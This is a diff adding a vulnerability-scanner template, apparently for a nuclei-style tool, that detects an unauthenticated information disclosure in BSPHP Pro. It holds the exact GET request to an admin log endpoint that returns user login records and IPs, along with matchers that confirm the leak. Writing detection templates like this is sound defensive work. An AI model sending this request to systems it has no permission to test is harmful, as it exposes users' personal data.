@@ -1,0 +1,27 @@
+id: bsphp-info
+name: BSPHP - Information Disclosure
+severity: low
+confidence: confirmed
+description: Information disclosure in BSPHP Pro causing user and unauth IP disclosure.
+reference: https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/BSPHP%20index.php%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+tags:
+- bsphp
+- info
+- disclosure
+- vuln
+requests:
+- method: GET
+  path: /admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0
+  matchers:
+  - type: body
+    words:
+    - '{"data":'
+    - '"id"'
+    - '"user"'
+  - type: body
+    words:
+    - application/json
+  - type: status
+    status:
+    - 200
+  condition: and
